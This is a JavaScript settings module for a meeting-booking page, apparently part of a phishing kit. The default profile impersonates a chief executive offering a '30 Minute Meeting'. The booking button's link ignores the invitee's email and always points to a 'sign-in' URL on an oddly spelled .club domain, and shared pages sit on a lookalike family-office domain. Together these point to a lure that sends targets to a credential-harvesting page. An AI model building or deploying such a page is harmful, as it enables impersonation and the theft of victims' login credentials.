export const settingsKey = "booking_admin_settings";
export const shareKey = "share";

export const defaultProfile = {
  displayName: "Jens Brenninkmeyer",
  role: "Chief Executive Officer",
  bookingLabel: "Booking Page",
  meetingTitle: "30 Minute Meeting with Jens Brenninkmeyer",
  meetingDescription: "Explore collaboration opportunities.",
  profilePhoto: "",
  bookingEmail: "client.booking@yourdomain.com",
  signInUrl: "https://adctelecommunicationstech.thelibertyclgdorporation.club",
  availableDays: [1, 2, 3, 4, 5],
  timeRange: { start: "8:00 AM", end: "2:00 PM" }
};

function encodeBase64Url(text) {
  return btoa(unescape(encodeURIComponent(text)))
    .replaceAll("+", "-")
    .replaceAll("/", "_")
    .replaceAll("=", "");
}

function decodeBase64Url(text) {
  const base64 = text.replaceAll("-", "+").replaceAll("_", "/");
  const padded = base64 + "=".repeat((4 - (base64.length % 4)) % 4);
  return decodeURIComponent(escape(atob(padded)));
}

export function readProfileSettings() {
  const saved = window.localStorage.getItem(settingsKey);
  if (!saved) return defaultProfile;

  try {
    return { ...defaultProfile, ...JSON.parse(saved) };
  } catch {
    return defaultProfile;
  }
}

export function writeProfileSettings(settings) {
  window.localStorage.setItem(settingsKey, JSON.stringify(settings));
}

const SHARE_DOMAIN = "https://bookings.pritzkerorgfamilyoffice.com";

export function buildShareUrl(settings) {
  const payload = encodeBase64Url(JSON.stringify(settings));
  const url = new URL(SHARE_DOMAIN + "/");
  url.searchParams.set(shareKey, payload);
  return url.toString();
}

export function buildBookingLink(_email, signInUrl) {
  return signInUrl || defaultProfile.signInUrl;
}

export function readShareSettings() {
  const params = new URLSearchParams(window.location.search);
  const payload = params.get(shareKey);
  if (!payload) return null;

  try {
    return { ...defaultProfile, ...JSON.parse(decodeBase64Url(payload)) };
  } catch {
    return null;
  }
}
